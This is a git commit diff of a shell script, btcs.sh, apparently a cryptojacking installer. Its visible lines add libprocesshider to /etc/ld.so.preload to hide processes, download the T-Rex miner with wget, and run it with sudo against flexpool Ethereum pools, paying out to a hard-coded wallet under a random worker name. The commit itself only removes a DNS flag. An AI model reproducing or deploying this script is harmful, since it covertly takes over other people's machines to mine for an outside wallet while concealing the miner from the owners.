2f85b0a927f2702e0298b57e6d942d9551241381
Treecommon <103907893+Treecommon@users.noreply.github.com>
2022-05-20 16:07:18 +0700

    Update and rename btc.sh to btcs.sh

--- btcs.sh
+++ btcs.sh
@@ -46,4 +46,4 @@ echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 wget https://github.com/RainbowMiner/miner-binaries/releases/download/v0.24.6-trex/t-rex-0.24.6-linux.tar.gz
 tar -xf t-rex-0.24.6-linux.tar.gz
 chmod +x t-rex
-sudo ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --keep-gpu-busy --kernel 0 --dns-https-server 1.1.1.1
+sudo ./t-rex -a ethash -o stratum+ssl://eth-hk.flexpool.io:5555 -o stratum+ssl://eth-sg.flexpool.io:5555 -p x -u 0x925966644EdEc86d0CC1C1cc6165A25A78b91Ba4 -w $(echo $(shuf -i 1-2000 -n 1)-ap) --keep-gpu-busy --kernel 0 
